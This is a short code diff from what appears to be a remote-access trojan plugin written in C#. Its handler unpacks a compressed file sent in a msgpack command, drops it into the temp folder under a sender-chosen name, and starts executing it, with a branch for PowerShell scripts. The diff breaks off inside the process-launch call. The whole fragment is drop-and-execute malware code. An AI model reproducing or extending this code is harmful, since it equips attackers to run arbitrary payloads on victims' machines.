@@ -14,10 +14,20 @@ namespace Plugin.Handler
         {
             try
             {
-                //Drop To Disk
-                string fullPath = Path.Combine(Path.GetTempPath(), Methods.GetRandomString(6) + unpack_msgpack.ForcePathObject("Extension").AsString);
+                string fullPath = Path.Combine(Path.GetTempPath(), unpack_msgpack.ForcePathObject("FileName").AsString);
+                if (File.Exists(fullPath)) 
+                {
+                    try 
+                    {
+                        File.Delete(fullPath); 
+                    } 
+                    catch 
+                    {
+                        fullPath = Path.Combine(Path.GetTempPath(), Methods.GetRandomString(6)+Path.GetExtension(unpack_msgpack.ForcePathObject("FileName").AsString));
+                    }
+                }
                 File.WriteAllBytes(fullPath, Zip.Decompress(unpack_msgpack.ForcePathObject("File").GetAsBytes()));
-                if (unpack_msgpack.ForcePathObject("Extension").AsString.ToLower().EndsWith(".ps1"))
+                if (unpack_msgpack.ForcePathObject("FileName").AsString.ToLower().EndsWith(".ps1"))
                 {
                     Process.Start(new ProcessStartInfo
                     {
